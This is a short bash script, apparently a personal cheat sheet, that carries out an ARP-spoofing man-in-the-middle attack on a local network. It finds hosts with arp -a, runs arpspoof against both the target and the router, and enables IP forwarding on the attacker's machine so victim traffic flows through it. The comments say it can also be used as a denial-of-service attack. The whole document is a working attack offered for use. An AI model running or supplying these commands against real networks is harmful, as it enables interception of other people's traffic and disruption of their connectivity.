#!/bin/bash
#To find ips with mac address
arp -a 

#We tell the target machine that we are the router/spoofing
#Can also be used as a DDOS attack
arpspoof -i interface -t targetip routerip

#We tell the router that we are actually the target device
arpspoof -i interface -t routerip targetip

#Enable port forwarding from hacker pc, to let packets to follow through like router
echo 1 > /proc/sys/net/ipv4/ip_forward
